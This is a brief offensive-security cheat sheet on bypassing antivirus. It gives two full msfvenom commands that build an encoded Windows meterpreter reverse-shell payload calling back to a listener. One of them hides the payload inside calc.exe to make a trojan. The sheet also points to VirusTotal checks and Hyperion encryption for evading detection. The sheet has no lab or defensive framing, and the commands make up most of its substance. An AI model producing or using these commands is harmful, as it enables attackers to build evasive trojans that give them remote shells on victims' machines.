# Bypassing Antivirus

## How to Find which AV Detects Malware

* find out which AV the target uses.
* upload malware to [virtustotal.com](http://virtustotal.com/) and see if the specific AV finds it

## Encoding

* can be done with msfvenom and metasploit
* notice how we set the -e flag here, and then use the shikata\_ga\_nai encoding
* not that effective since antivirus-vendors have access too

### Example

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -o meterpreter_encoded.exe
```

## Embed in Non-Malicious File

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
x86/shikata_ga_nai -i 9 -x calc.exe -o bad_calc.exe
```

## Encrypting the malware

* encrypt the malware and radically change the signature
* Hyperion is a great tool for malware encryption

